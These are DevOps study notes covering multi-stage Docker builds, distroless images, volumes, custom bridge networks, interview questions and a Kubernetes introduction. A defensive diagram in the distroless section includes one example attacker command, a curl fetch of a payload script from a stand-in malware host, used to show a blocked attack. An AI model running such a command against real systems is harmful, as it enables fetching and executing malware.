# 🏗️ Day 26: Multi-Stage Docker Builds & Distroless Images

**Goal:** Reduce Docker image size and improve security for production deployments.

---

## 🔵 The Problem: Bloated Images

Beginner Dockerfile approach:
```dockerfile
FROM ubuntu              # Full OS
RUN apt install maven    # Build tools
COPY . .                 # Source code
RUN mvn build            # Compile
```

**Result:** Final image = App + OS + Compilers + Source Code = **800MB+**

> ⚠️ None of the build tools are needed at **runtime** — only at **build time**. They're just dead weight.

**Real impact of large images:**
- Slower deployments (more data to transfer)
- Larger attack surface (more packages = more vulnerabilities)
- Higher storage costs in registries

---

## 🔵 Solution 1: Multi-Stage Docker Builds

> Split the Dockerfile into a **"Construction Site"** and a **"Final Product"**.

```dockerfile
# ── STAGE 1: Build Stage (heavy, discarded after) ──────────────────
FROM ubuntu AS build
RUN apt-get install -y maven curl
COPY . .
RUN mvn clean package    # Compile the app → produces a .jar file

# ── STAGE 2: Final Stage (tiny, this is what gets shipped) ──────────
FROM openjdk:11-jre-slim
WORKDIR /app
COPY --from=build /app/target/myapp.jar .    # ← The Magic Line
CMD ["java", "-jar", "myapp.jar"]
```

**What `COPY --from=build` does:**
- Copies **only the compiled artifact** (`.jar`) from Stage 1
- Everything else in Stage 1 (source code, Maven, Ubuntu) is **thrown away**
- Final image = JRE + compiled app only

---

## 🔵 Solution 2: Distroless Images

> Remove everything that isn't needed to run the app — including the shell.

**What Distroless images do NOT contain:**
- Package managers (`apt`, `yum`)
- Shell (`bash`, `sh`)
- Standard utilities (`ls`, `curl`, `wget`, `find`)

**Security benefit:**
```
Hacker breaks into container
       ↓
Tries: curl http://malware.com/payload.sh
       ↓
ERROR: curl: command not found
       ↓
Attack surface eliminated ✅
```

**Where to find them:** `GoogleContainerTools` GitHub repository

---

## 🔵 The Ultimate Example: Go + Scratch

Go compiles to a **single static binary** with no runtime dependencies → can use `FROM scratch` (completely empty image).

| Build Type | Image Size |
|---|---|
| Ubuntu + Go + Source Code | **861 MB** |
| Multi-Stage + Scratch | **1.83 MB** |

> **~800x reduction in image size.**

### 🎙️ Interview Answer: "Challenges with Docker in production?"
> *"We had bloated images — 800MB+ because build tools and source code were bundled into the final image. We solved this with Multi-Stage Builds: compile in Stage 1, copy only the artifact to Stage 2. We also switched to Distroless images to remove the shell and standard utilities, which drastically reduces the attack surface. If a hacker breaks in, they can't run `curl` or `wget` to download malware because those tools simply don't exist in the image."*

# 🗄️ Day 27: Docker Volumes & Bind Mounts

**Goal:** Understand how to persist data beyond the container lifecycle.

---

## 🔵 The Problem: Containers Are Ephemeral

> By default, when a container dies — **all its data dies with it**.

```
Container running → crash/delete → ALL internal files gone ❌
```

**Real-world impact:**
- **Nginx crashes** → access logs (needed for security audit) lost forever
- **Backend crashes** → generated JSON/HTML files for frontend disappear

---

## 🔵 Two Types of Persistent Storage

### 🅰️ Bind Mounts

> Manually map a host folder to a container folder.

```bash
docker run -v /home/ubuntu/data:/app/data nginx
#           ^host path         ^container path
```

- Any file saved inside `/app/data` (container) appears in `/home/ubuntu/data` (host)
- **Limitation:** Tightly coupled to the host's specific file structure

---

### 🅱️ Docker Volumes ⭐ (Recommended)

> A "logical partition" managed entirely by Docker — you don't care where files live on disk.

```bash
docker volume create mydata
docker run --mount source=mydata,target=/app nginx
```

**Why Volumes beat Bind Mounts:**

| Feature | Bind Mount | Docker Volume |
|---|---|---|
| **Managed by** | You (host path) | Docker |
| **Remote storage** | ❌ Local only | ✅ S3, NFS, cloud |
| **Backup/migrate** | Manual | Easy with Docker CLI |
| **Performance** | Standard | ✅ Optimized for I/O |
| **Portability** | ❌ Host-dependent | ✅ Works anywhere |

---

## 🔵 `-v` vs `--mount` (Syntax Choice)

| Flag | Style | Readability |
|---|---|---|
| `-v /host:/container` | Shorthand | Compact but hard to read |
| `--mount source=vol,target=/app` | Verbose | ✅ Clear and explicit |

> ✅ **Always use `--mount` in production scripts** — easier for teammates to read and debug.

---

## 🔵 Volume Lifecycle Commands

```bash
# Create
docker volume create mydata

# List all volumes
docker volume ls

# Inspect (see mount path, creation date)
docker volume inspect mydata

# Attach to container
docker run --mount source=mydata,target=/app nginx

# Delete
docker volume rm mydata
```

> ⚠️ **Cannot delete a volume attached to a running or stopped container.** Remove the container first.

### 🎙️ Interview Answer: "How do you persist data in Docker?"
> *"By default containers are ephemeral — data is lost when they stop. I use Docker Volumes to persist data outside the container lifecycle. Volumes are managed by Docker and can be backed by remote storage like S3 or NFS. In scripts I use the `--mount` syntax over `-v` because it's more readable. I avoid Bind Mounts in production because they're tied to the host's specific directory structure."*

# 🌐 Day 28: Docker Networking

**Goal:** Control how containers communicate — and how to isolate them for security.

---

## 🔵 The Problem: Two Conflicting Requirements

| Requirement | Example |
|---|---|
| **Communication needed** | Frontend container must talk to Backend container |
| **Isolation needed** | "Login" container must NOT reach "Finance/Payment" container |

> If a hacker breaches the Login app, they should have no path to your payment system.

---

## 🔵 The 3 Docker Network Types

| Network | How It Works | Use Case |
|---|---|---|
| **Bridge** (default) | Virtual network on host. Containers get internal IPs (172.17.x.x) | Standard single-host container communication |
| **Host** | No isolation — container shares host's IP/network | High performance, but causes port conflicts & security risks |
| **Overlay** | Spans multiple physical servers | Kubernetes / multi-host clusters |

---

## 🔵 The Security Flaw: Default Bridge

> All containers created without specifying a network go to the **Default Bridge** — they can all talk to each other.

```
Default Bridge Network
├── login-container (public-facing)
├── logout-container
├── finance-container (sensitive!)  ← ⚠️ reachable from login!
└── payment-container (sensitive!)  ← ⚠️ reachable from login!
```

---

## 🔵 The Fix: Custom Bridge Networks

```bash
# Step 1: Create isolated network
docker network create secure-network

# Step 2: Run sensitive container on isolated network
docker run --network secure-network finance-app

# Step 3: Login container stays on default bridge
docker run login-app

# Result: login-app CANNOT ping finance-app ✅
```

**Before (insecure):**
```
login (172.17.0.2) → can ping → finance (172.17.0.3) ❌
```

**After (secure — custom network):**
```
login (172.17.0.2) → cannot ping → finance (172.19.0.2) ✅
```

---

## 🔵 Key Networking Commands

```bash
docker network ls                          # List all networks
docker network create my-network           # Create custom bridge
docker run --network my-network <image>    # Attach container to network
docker inspect <container>                 # See container's IP and network
docker network inspect bridge              # See all containers on bridge
```

### 🎙️ Interview Answer: "How do you secure container-to-container communication?"
> *"By default all containers share the Bridge network and can talk to each other, which is a security risk. I create Custom Bridge Networks to isolate sensitive services. For example, I put the Payment service on a separate network from the Login service. Even if an attacker compromises the Login container, they have no network path to the Payment service because they're on completely different subnets."*

# 🎯 Day 29: Docker Interview Questions

**Goal:** Bridge the gap between knowing commands and explaining Docker confidently in an interview.

---

## 🔵 Basics

### Q: What is Docker?
> *"Docker is an open-source platform for managing the complete lifecycle of containers — building images from Dockerfiles, running containers, and pushing images to registries like Docker Hub."*

### Q: Container vs VM?

| | Container | VM |
|---|---|---|
| **OS** | Shares host kernel | Full Guest OS |
| **Size** | ~28 MB | ~2.3 GB |
| **Start time** | Milliseconds | Minutes |
| **Isolation** | Logical | Full |
| **Runs on** | Container Engine | Hypervisor |

---

## 🔵 Architecture Questions

### Q: Explain Docker architecture.
> *"Docker uses a Client-Server model. The Docker Client (CLI) sends commands to the Docker Daemon via API calls. The Daemon manages images and containers. Images are stored in a registry like Docker Hub."*

### Q: What is the Docker Daemon's weakness?
> *"The Daemon is a single point of failure — if it crashes, all running containers stop. It also runs as root, which is a security concern. Alternatives like Podman solve this by being daemonless and rootless."*

---

## 🔵 Command Distinctions (Trick Questions)

### Q: COPY vs ADD?

| | COPY | ADD |
|---|---|---|
| **Source** | Local files only | Local files OR remote URLs |
| **Extra feature** | None | Auto-extracts `.tar`/`.zip` |
| **Recommended** | ✅ Use COPY by default | Only when you need URL/extract |

> Best practice: Use `COPY` unless you specifically need `ADD`'s extra features.

### Q: CMD vs ENTRYPOINT?

| | CMD | ENTRYPOINT |
|---|---|---|
| **Can be overridden?** | ✅ Yes, at runtime | ❌ Not easily |
| **Purpose** | Default arguments | Fixed executable |
| **Example** | `manage.py runserver` | `python3` |

```dockerfile
ENTRYPOINT ["python3"]          # Always python3 — locked
CMD ["manage.py", "runserver"]  # Can override: docker run myapp manage.py migrate
```

---

## 🔵 Production Scenario Answers

### Q: "What production challenges have you faced with Docker?"

**Answer 1 — Daemon Failure:**
> *"The Docker Daemon is a single point of failure. If it goes down, all containers on that host stop. We mitigated this by using orchestration tools like Kubernetes, which automatically reschedules containers on healthy nodes."*

**Answer 2 — Noisy Neighbor:**
> *"One container can consume all host memory, killing the others. We solved this by setting resource limits using `--memory` and `--cpus` flags."*

**Answer 3 — Security Vulnerabilities:**
> *"Base images like Ubuntu contain many unused packages that introduce CVEs. We used Snyk to scan images and migrated to Distroless images to eliminate unnecessary OS components."*

# ☸️ Day 30: Introduction to Kubernetes

**Goal:** Understand why Kubernetes exists by learning the 4 problems Docker can't solve alone.

---

## 🔵 Core Definitions

| Tool | What It Is |
|---|---|
| **Docker** | Container **Platform** — creates and runs containers on a single machine |
| **Kubernetes (K8s)** | Container **Orchestration Platform** — manages thousands of containers across many machines |

> 🎯 **Simple analogy:** Docker = individual worker. Kubernetes = the manager coordinating thousands of workers.

---

## 🔵 The 4 Problems Docker Alone Can't Solve

### 🅰️ Single Host — "Noisy Neighbor" Problem

```
Docker Host (1 machine)
├── Container 1 (normal)
├── Container 2 (normal)
└── Container 3 ← consumes 100% RAM → kills all other containers ❌
```

- Docker runs on **one machine** by default
- One bad container crashes the **entire host**
- If host goes down → **entire application goes down**

---

### 🅱️ No Auto-Healing

```
Container crashes at 3 AM
       ↓
Docker: does nothing ❌
       ↓
DevOps engineer wakes up, manually restarts it
```

- Docker doesn't automatically restart crashed containers
- You **cannot manually monitor 10,000 containers 24/7**

---

### 🅲 No Auto-Scaling

```
Netflix movie release → traffic spikes 10x
       ↓
Docker: still running same number of containers ❌
       ↓
App crashes under load
```

- Docker can't automatically add more containers when traffic spikes
- Manual scaling is too slow for real-time traffic bursts

---

### 🅳 No Enterprise Features

- No built-in **advanced load balancing**
- No built-in **API Gateway**
- No built-in **advanced firewall rules**
- Large enterprises (banks, e-commerce) need these out of the box

---

## 🔵 How Kubernetes Solves Each Problem

> Kubernetes was built by Google based on their internal tool **"Borg"** — battle-tested at Google scale.

| Docker Problem | Kubernetes Solution |
|---|---|
| Single host — one failure = total outage | **Cluster** — multiple nodes; work moves to healthy node automatically |
| No auto-healing | **Auto-Healing** — detects crash, restarts/replaces container before user notices |
| No auto-scaling | **HPA (Horizontal Pod Autoscaler)** — "If CPU > 80%, add more containers" |
| No enterprise features | **Extensible via CRDs** — supports Ingress, advanced LB, security policies |

```
Kubernetes Cluster
├── Master Node (Control Plane — brain)
├── Worker Node 1 → running containers
├── Worker Node 2 → running containers
└── Worker Node 3 → running containers (if Node 2 dies, work moves here)
```

---

```
Day 24–25: Package apps with Docker (Build → Ship → Run)
Day 26:    Optimize Docker images (Multi-Stage + Distroless)
Day 27:    Persist data (Volumes)
Day 28:    Secure networking (Custom Bridge Networks)
```

### 🎙️ Interview Answer: "Why Kubernetes over Docker alone?"
> *"Docker is great for building and running containers, but it has four key limitations in production: it runs on a single host (single point of failure), it has no auto-healing when containers crash, it can't auto-scale during traffic spikes, and it lacks enterprise networking features. Kubernetes solves all four — it clusters multiple machines, automatically restarts failed containers, scales with HPA, and supports extensible networking through CRDs and Ingress controllers."*

### 🎙️ Interview Answer: "What is Kubernetes?"
> *"Kubernetes is a container orchestration platform originally developed by Google based on their internal Borg system. It manages containers at scale across a cluster of machines, providing auto-healing, auto-scaling, load balancing, and self-service infrastructure. In production, I use it to ensure containers are always running, automatically scale under load, and that no single server failure takes down the application."*

| ✅ DO | ❌ DON'T |
|---|---|
| Open with a confident definition | Start with "umm" or "so basically" |
| Use analogies (construction site, noisy neighbor) | Give only textbook answers |
